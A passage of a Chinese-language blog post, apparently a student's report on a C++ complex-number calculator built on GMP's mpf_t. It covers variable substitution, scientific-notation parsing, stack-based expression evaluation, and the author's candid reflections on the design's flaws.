class="type">int</span> idx=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> next_idx=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span>&amp; it : umap) &#123;</span><br><span class="line">idx=buf.<span class="built_in">find</span>(it.first,next_idx);</span><br><span class="line">        <span class="keyword">if</span>(idx!= std::string::npos)&#123;<span class="comment">//如果不等于，说明找到了</span></span><br><span class="line">            next_idx=idx+it.first.<span class="built_in">length</span>();</span><br><span class="line">            buf.<span class="built_in">replace</span>(idx,it.first.<span class="built_in">length</span>(),it.second);<span class="comment">//用值替换对应对的键</span></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">if</span>(buf.<span class="built_in">find</span>(<span class="string">&#x27;_&#x27;</span>)!=std::string::npos)&#123;<span class="comment">//如果还找到相对应对的标识符,输出,未定义对的变量.</span></span><br><span class="line">        cerr&lt;&lt;<span class="string">&quot;未定义的变量&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>改进后，把idx&#x3D;buf.find(it.first,next_idx);改为idx&#x3D;buf.find(it.first,0)，之后就可以随便加都可以了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">NameTraslate</span><span class="params">(string &amp;buf)</span></span>&#123;</span><br><span class="line">    string::const_iterator it = buf.<span class="built_in">begin</span>();</span><br><span class="line">    string::const_iterator word_start;</span><br><span class="line">    string::const_iterator word_end;</span><br><span class="line">    string word;</span><br><span class="line">    <span class="type">int</span> idx=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> next_idx=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span>&amp; it : umap) &#123;</span><br><span class="line">idx=buf.<span class="built_in">find</span>(it.first,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(idx!= std::string::npos)&#123;<span class="comment">//如果不等于，说明找到了</span></span><br><span class="line">            next_idx=idx+it.first.<span class="built_in">length</span>();</span><br><span class="line">            buf.<span class="built_in">replace</span>(idx,it.first.<span class="built_in">length</span>(),it.second);<span class="comment">//用值替换对应对的键</span></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">if</span>(buf.<span class="built_in">find</span>(<span class="string">&#x27;_&#x27;</span>)!=std::string::npos)&#123;<span class="comment">//如果还找到相对应对的标识符,输出,未定义对的变量.</span></span><br><span class="line">        cerr&lt;&lt;<span class="string">&quot;未定义的变量&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1701355653195-68a64dfb-6481-47ee-9e09-9a6e53e03f4f.png"></p><p>:::info<br><font style="color:rgb(0,0,0);">5. 可尝试支持科学计数法的输入，尝试支持大浮点数（如1.0e200等）。</font></p><p>:::</p><p>格式肯定是支持的，但是小数点的处理真不太行。虽然说把它分成指数exp和基数base来处理的思想是没错的，但是对位数的处理，有挺大的问题，特别是字符串的数据有多种情况。</p><p>这里突然想到，如果我们一开始把科学技术法的处理或者传入的数据是一个mpf_t高精度格式，让其库的函数来处理，会不会更好？特别是mpf_get_str会返回exponent的位置，我们直接根据这个位置插入小数点会不会更好？</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">ETraslate</span><span class="params">(string &amp;buf)</span></span>&#123;</span><br><span class="line">    string s=buf;</span><br><span class="line">    <span class="type">int</span> idx_e = s.<span class="built_in">find</span>(<span class="string">&quot;E&quot;</span>);</span><br><span class="line">    <span class="type">int</span> idx_ch =s.<span class="built_in">find</span>(<span class="string">&quot;#&quot;</span>);</span><br><span class="line">    <span class="type">int</span> idx_i=s.<span class="built_in">find</span>(<span class="string">&quot;i&quot;</span>);</span><br><span class="line">    <span class="type">bool</span> flag_i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(idx_e!= std::string::npos)&#123;</span><br><span class="line">        <span class="keyword">if</span>(idx_i!=std::string::npos)&#123;</span><br><span class="line">            buf.<span class="built_in">pop_back</span>();<span class="comment">//把i给pop掉</span></span><br><span class="line">            flag_i=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(idx_ch!= std::string::npos)&#123;<span class="comment">//如果存在的话&#123;</span></span><br><span class="line">            buf[idx_ch]=<span class="string">&#x27;-&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        string base = s.<span class="built_in">substr</span>(<span class="number">0</span>, idx_e); <span class="comment">//获取小数部分</span></span><br><span class="line">        <span class="type">int</span> exp = <span class="built_in">stoi</span>(s.<span class="built_in">substr</span>(idx_e + <span class="number">1</span>)); <span class="comment">//获取指数部分</span></span><br><span class="line">        buf=<span class="built_in">AdjustResult</span>(exp,base);</span><br><span class="line">        <span class="keyword">if</span>(flag_i)&#123;</span><br><span class="line">            buf.<span class="built_in">append</span>(<span class="string">&quot;i&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">string <span class="title">AdjustResult</span><span class="params">(<span class="type">int</span> exp,string &amp;buf)</span></span>&#123;</span><br><span class="line">    string adjust_result;</span><br><span class="line">    <span class="keyword">if</span> (exp &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 计算小数点需要向左移动的位数</span></span><br><span class="line">        <span class="type">int</span> move = -exp;</span><br><span class="line">        adjust_result = <span class="string">&quot;0.&quot;</span> + std::<span class="built_in">string</span>(move, <span class="string">&#x27;0&#x27;</span>) + buf;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 在整数部分后面拼接exp个&quot;0&quot;</span></span><br><span class="line">        adjust_result = buf + std::<span class="built_in">string</span>(exp, <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> adjust_result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1701356178560-0cdaf5a6-4531-4cf3-a9aa-e32ca61db6ab.png"></p><p>:::info</p><ol start="6"><li>可尝试支持大数，支持高精度计算（可调用相关高精度运算库）。</li></ol><p>:::</p><p>只能说托mpf的福，没问题，但是表达式执行算法有大问题。</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1701356730668-9eef0e9c-572a-42b6-aa2c-28f796453797.png"></p><p>:::info<br><font style="color:rgb(0,0,0);">7. </font><font style="color:rgb(0,0,0);">可尝试多种方式对代码进行优化，包括执行速度、功能等（如在交互中支持</font><font style="color:rgb(0,0,0);">++</font><font style="color:rgb(0,0,0);">，</font><font style="color:rgb(0,0,0);">+&#x3D;</font><font style="color:rgb(0,0,0);">，</font><font style="color:rgb(0,0,0);">- </font></p><p><font style="color:rgb(0,0,0);">-</font><font style="color:rgb(0,0,0);">，</font><font style="color:rgb(0,0,0);">-&#x3D;</font><font style="color:rgb(0,0,0);">，</font><font style="color:rgb(0,0,0);">*&#x3D;</font><font style="color:rgb(0,0,0);">，</font><font style="color:rgb(0,0,0);">&#x2F;&#x3D;</font><font style="color:rgb(0,0,0);">等操作）；可以尝试完善错误提示，让错误提示更加明确；尝试允许用户自 </font></p><p><font style="color:rgb(0,0,0);">选输出方式，如是否采用科学计数法等；可内嵌帮助文档，通过特定指令能够输出对应帮 </font></p><p><font style="color:rgb(0,0,0);">助文档。</font></p><p>:::</p><p>由于上面的六种基本要求都没有完成，所以这一方面也没时间下手。</p><p>:::info<br><font style="color:rgb(0,0,0);">8. </font><font style="color:rgb(0,0,0);">请勿直接采用他人的复数实现代码。 </font></p><p><font style="color:rgb(0,0,0);">9. </font><font style="color:rgb(0,0,0);">项目报告需对需求进行分析，描述实现方案与项目特色。报告应包含核心代码并进行解 </font></p><p><font style="color:rgb(0,0,0);">释。如果编译运行复杂，请提供编译运行代码的说明。提供运行结果的展示（如截图）， </font></p><p><font style="color:rgb(0,0,0);">并尽量给出性能展示与分析。最后给出总结。同时，鼓励写上实现代码时遇到的困难以及 </font></p><p><font style="color:rgb(0,0,0);">相应的解决思路&#x2F;方案。</font></p><p>:::</p><p>这里就贴出核心代码进行解释吧，既然是个残次品，其实效率真的低，代码也冗长</p><h3 id="hD6Jq">表达式拆分，操作数操作符分别入栈</h3><p>在一开始我们将科学计数法E后面的符号换成另一个符号#来处理</p><p>对于mod(),con()的翻译选择在拆分之前，不然里面的符号会影响拆分</p><p>拆分主要是选择运算符号为分界线进行拆分。</p><p>操作符通常是操作数-1（除去括号）</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;buf.<span class="built_in">length</span>();i++)&#123;</span><br><span class="line">    <span class="type">int</span> idx_e=buf.<span class="built_in">find</span>(<span class="string">&#x27;E&#x27;</span>,i);<span class="comment">//找到E的位置</span></span><br><span class="line">    <span class="keyword">if</span>(idx_e!= std::string::npos)&#123;</span><br><span class="line">        <span class="keyword">if</span>(buf[idx_e+<span class="number">1</span>]==<span class="string">&#x27;-&#x27;</span>)&#123;<span class="comment">//如果e的下个字符是-号的话,换成不处理的符号</span></span><br><span class="line">          buf[idx_e+<span class="number">1</span>]=<span class="string">&#x27;#&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(buf[i]==<span class="string">&#x27;+&#x27;</span>||buf[i]==<span class="string">&#x27;-&#x27;</span>||buf[i]==<span class="string">&#x27;*&#x27;</span>||buf[i]==<span class="string">&#x27;/&#x27;</span>||buf[i]==<span class="string">&#x27;(&#x27;</span>||buf[i]==<span class="string">&#x27;)&#x27;</span>)&#123;</span><br><span class="line">        idxoffset=i-idx_oper;</span><br><span class="line">        idx_oper=i;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(pre_idx==<span class="number">0</span>||idxoffset&gt;<span class="number">1</span>)&#123;<span class="comment">// 1*(2+3)  *和(下标差距为1   idx_oper=1, i=2  idxoffset=1</span></span><br><span class="line">            string temp;</span><br><span class="line">            <span class="keyword">if</span>(pre_idx==<span class="number">0</span>)&#123;</span><br><span class="line">                temp=buf.<span class="built_in">substr</span>(pre_idx,idxoffset);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(pre_idx!=<span class="number">0</span>)&#123;</span><br><span class="line">                temp=buf.<span class="built_in">substr</span>(pre_idx,idxoffset<span class="number">-1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">ETraslate</span>(temp);</span><br><span class="line">            bufstack1.<span class="built_in">push</span>(temp);<span class="comment">//2+3+6   则插入3</span></span><br><span class="line">            <span class="keyword">if</span>(buf[idx_oper+<span class="number">1</span>]==<span class="string">&#x27;(&#x27;</span>)&#123;</span><br><span class="line">                pre_idx=idx_oper+<span class="number">2</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                pre_idx=idx_oper+<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        opstack1.<span class="built_in">push</span>(buf[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(buf[i]!=<span class="string">&#x27;)&#x27;</span>&amp;&amp;i==buf.<span class="built_in">length</span>()<span class="number">-1</span>)&#123;<span class="comment">//到字符串末尾   idx_op=3  i=4  idx_offset=1 buf.length=5</span></span><br><span class="line">        string temp;</span><br><span class="line">        <span class="keyword">if</span>(pre_idx==<span class="number">0</span>)&#123;</span><br><span class="line">            temp=buf.<span class="built_in">substr</span>(idx_oper,buf.<span class="built_in">length</span>()-idx_oper);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            temp=buf.<span class="built_in">substr</span>(idx_oper+<span class="number">1</span>,buf.<span class="built_in">length</span>()-idx_oper<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">ETraslate</span>(temp);</span><br><span class="line">        bufstack1.<span class="built_in">push</span>(temp);<span class="comment">//2+3-6  插入6   </span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="oXP4Z">利用栈进行运算，以及优先级</h3><p>对栈中操作数操作符进行运算的代码有点长。。。其实真不应该，如果用mpf类型的栈的话，大不了特例化一个</p><p>这里贴出部分代码。</p><p>下面是我选用的优先级</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">WhoFirst</span><span class="params">(<span class="type">char</span> op)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(op==<span class="string">&#x27;(&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(op==<span class="string">&#x27;+&#x27;</span>||op==<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(op==<span class="string">&#x27;*&#x27;</span>||op==<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span>(op==<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    cerr&lt;&lt;<span class="string">&quot;错误的字符输入&quot;</span>&lt;&lt;endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对操作符栈1和栈2进行操作，栈1只是为了实现逆波兰表达式</p><p>如果栈1取出来的符号优先级比栈2高则继续从栈1取符号，同时取操作数</p><p>如果优先级低于栈2，则利用栈2顶部符号开始运算。</p><p>其实这里一开始栈就应该用mpf，这样也更好处理括号的问题，以及运算的问题，要用的时候进行重载就好了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(bufstack2.<span class="built_in">top</span>()!=<span class="string">&quot;@&quot;</span>||bufstack2.<span class="built_in">size</span>()&gt;<span class="number">1</span>||!opstack1.<span class="built_in">empty</span>()||!opstack2.<span class="built_in">empty</span>())&#123;<span class="comment">//依据操作符栈1是否为空判断是否结束</span></span><br><span class="line">        <span class="keyword">if</span>((!opstack1.<span class="built_in">empty</span>()))&#123;</span><br><span class="line">            <span class="keyword">if</span>(!opstack1.<span class="built_in">empty</span>()&amp;&amp;!opstack2.<span class="built_in">empty</span>()&amp;&amp;(<span class="built_in">WhoFirst</span>(opstack1.<span class="built_in">top</span>())&gt;=<span class="built_in">WhoFirst</span>(opstack2.<span class="built_in">top</span>())))&#123;<span class="comment">//来者的优先级比较大,就不管它</span></span><br><span class="line">                <span class="keyword">if</span>(opstack1.<span class="built_in">top</span>()==<span class="string">&#x27;(&#x27;</span>&amp;&amp;opstack2.<span class="built_in">top</span>()==<span class="string">&#x27;)&#x27;</span>)&#123;</span><br><span class="line">                    opstack1.<span class="built_in">pop</span>();</span><br><span class="line">                    opstack2.<span class="built_in">pop</span>();</span><br><span class="line">                &#125;</span><br><span class="line">                opstack2.<span class="built_in">push</span>(opstack1.<span class="built_in">top</span>());</span><br><span class="line">                opstack1.<span class="built_in">pop</span>();</span><br><span class="line">                bufstack2.<span class="built_in">push</span>(bufstack1.<span class="built_in">top</span>());</span><br><span class="line">                bufstack1.<span class="built_in">pop</span>();</span><br></pre></td></tr></table></figure><p>这里是运算的步骤，只放出加法运算</p><p>对于三个数55+45+100，直接计算没问题，就是对100+45&#x3D;145的结果放到栈2暂存，然后再从栈1读取55和+来继续运算</p><p>但是对于复数1+2i+3+4i，4i+3结果是一个字符串，如果放到栈2暂存，我们后面入栈2i和+的时候，计算就真不好算了，所以这里采用一个占位符@但是会产生一个问题，就是不知道该值是多少。</p><p>好像也可以用图来缓解这个问题，但是这个终究是算法的缺陷，终究是我考虑的不够全面，坑只会越填越多。</p><p>采用能够方便我们进行对象操作的算法和数据结构，类才是关键。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(!opstack1.<span class="built_in">empty</span>()&amp;&amp;!opstack2.<span class="built_in">empty</span>()&amp;&amp;(<span class="built_in">WhoFirst</span>(opstack1.<span class="built_in">top</span>())&lt;<span class="built_in">WhoFirst</span>(opstack2.<span class="built_in">top</span>())))&#123;<span class="comment">//来者的优先级比较小,我们就要进行</span></span><br><span class="line"><span class="type">char</span> op=opstack2.<span class="built_in">top</span>();</span><br><span class="line">opstack2.<span class="built_in">pop</span>();</span><br><span class="line"><span class="keyword">switch</span> (op)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">        <span class="comment">//bufstack2.top()=bufstack2.top()+bufstack1.top();//进行运算</span></span><br><span class="line">        <span class="keyword">if</span>(bufstack2.<span class="built_in">top</span>() ==<span class="string">&quot;@&quot;</span> &amp;&amp; mulsave.<span class="built_in">size</span>()!=<span class="number">0</span>)&#123;</span><br><span class="line">            result=result+mulsave.<span class="built_in">back</span>();</span><br><span class="line">            mulsave.<span class="built_in">pop_back</span>();</span><br><span class="line">            bufstack2.<span class="built_in">pop</span>();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(bufstack2.<span class="built_in">top</span>()==<span class="string">&quot;@&quot;</span>)</span><br><span class="line">                result=result+<span class="string">&quot;0&quot;</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                result=result+bufstack2.<span class="built_in">top</span>();</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;2+1:     &quot;</span>&lt;&lt;endl;</span><br><span class="line">            bufstack2.<span class="built_in">pop</span>();<span class="comment">//把0pop掉</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(bufstack2.<span class="built_in">top</span>() ==<span class="string">&quot;@&quot;</span> &amp;&amp; mulsave.<span class="built_in">size</span>()!=<span class="number">0</span>)&#123;</span><br><span class="line">            result=result+mulsave.<span class="built_in">back</span>();</span><br><span class="line">            mulsave.<span class="built_in">pop_back</span>();</span><br><span class="line">            bufstack2.<span class="built_in">pop</span>();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(bufstack2.<span class="built_in">top</span>()==<span class="string">&quot;@&quot;</span>)</span><br><span class="line">                result=result+<span class="string">&quot;0&quot;</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                result=result+bufstack2.<span class="built_in">top</span>();</span><br><span class="line">            bufstack2.<span class="built_in">pop</span>();<span class="comment">//把0pop掉</span></span><br><span class="line">        &#125;</span><br><span class="line">        bufstack2.<span class="built_in">push</span>(<span class="string">&quot;@&quot;</span>);<span class="comment">//推入0,是为了代替运算后的结构的数据,因为运算后的结果已经保存到COM中了</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><h3 id="jVzK2">mpf精度问题</h3><p>mpf浮点数结构体</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gmp.h</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> _mp_prec;<span class="comment">// mp_limb_t 的最大精度。由 mpf_init 设置，</span></span><br><span class="line">                <span class="comment">// 由 mpf_set_prec 修改。</span></span><br><span class="line">                <span class="comment">// _mp_d字段指向的区域包含&#x27; prec&#x27; + 1个 limb(s)。</span></span><br><span class="line">  <span class="type">int</span> _mp_size;<span class="comment">// abs(_mp_size)是最后一个字段指向的 limb(s) 数。</span></span><br><span class="line">                <span class="comment">// 如果 _mp_size 是负数，则这就是一个负数。</span></span><br><span class="line">  <span class="type">mp_exp_t</span> _mp_exp; <span class="comment">// 以 mp_limb_t 为底的指数。</span></span><br><span class="line">  <span class="type">mp_limb_t</span> *_mp_d; <span class="comment">// 指向 limb(s) 的指针。</span></span><br><span class="line">&#125; __mpf_struct;</span><br></pre></td></tr></table></figure><p>mpf_t我们直接用init初始化的话是有问题的，因为这样返回的字符串，以及精度最多在21位就被截断了。</p><p>我们需要使用mpf_inits(a,333);后面的333能够让我们有100位的精度。<a href="https://www.coder.work/article/1217769#:~:text=%E8%AE%A1%E7%AE%97%E5%88%B0%E8%B6%85%E8%BF%87%20100%20%E4%BD%8D%E5%8F%AA%E9%9C%80%E8%A6%81%E5%B0%86%20mpf_int%20%28x%29%20%E6%9B%B4%E6%94%B9%E4%B8%BA%20mpf_init2%20%28x%2C,%28%29%20%E5%8F%AF%E8%83%BD%E4%BC%9A%E5%90%91%E4%B8%8A%E8%88%8D%E5%85%A5%E6%9C%80%E5%90%8E%E4%B8%80%E4%BD%8D%E6%95%B0%E5%AD%97%EF%BC%8C%E5%9B%A0%E6%AD%A4%E6%88%AA%E6%96%AD%E8%BE%93%E5%87%BA%E5%B0%86%E6%9B%B4%E5%8A%A0%E6%A3%98%E6%89%8B%E3%80%82%20%E4%B8%80%E7%A7%8D%E2%80%9C%E5%87%A0%E4%B9%8E%E6%80%BB%E6%98%AF%E2%80%9D%E6%9C%89%E6%95%88%E7%9A%84%E6%96%B9%E6%B3%95%E6%98%AF%E4%BD%BF%E7%94%A8%20mpf_get_str%20%28%29%20%E5%88%9B%E5%BB%BA%E7%B2%BE%E5%BA%A6%E8%B6%85%E8%BF%87%20100%20%E4%BD%8D%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%8C%E7%84%B6%E5%90%8E%E6%88%AA%E6%96%AD%E8%AF%A5%E5%AD%97%E7%AC%A6%E4%B8%B2%E3%80%82">参考</a></p><h1 id="WyVfa">总结</h1><p>总结就是，第二次项目可以说是另辟蹊径做出来的残次品，功能并不完全。。。所以我也挺不满意的，其实应该做到一半就大改结构和思路，不明白自己为什么那么固执，非要填那些填不上的坑，不如早点听别人意见。</p><p>填坑消耗的时间又多，做的又不理想…</p><p>这里说一下我这个残次品的思路和后面想到的理想中的思路吧，也就说出来我做了什么。</p><h2 id="VC6A9">残次品的思路</h2><p>对于大数字的处理，我们肯定要对字符串进行操作。</p><p>所以此程序以字符串为基础，设置相关的数据结构比如栈，我们的Complex类采用mpf_t，有一个函数mpf_get_str能够将mpf_t值转化为字符串（稍有差异）</p><p>所以这里的操作层面都是对字符串进行操作的，对从栈取出的字符串的处理和操作符的处理我的方式是有问题的，无法解析括号甚至无法处理复杂加减乘除的表达式。甚至对多个乘法的结果相加，借助了一个向量和一个无意义符号@，这也让我们的代码变成冗长难以理解</p><h2 id="VgffY">理想的思路</h2><p>如果使用mpf_t的栈来运算，重载其运算符，mpf_t的栈进行特例化。</p><p>这样肯定会让我们的代码简洁很多。</p><p>优先级设置，以及括号的解析也能够更加容易得实现。我们对字符操作完后，填充其他符号了。</p><h1 id="SJMrH">源代码</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span 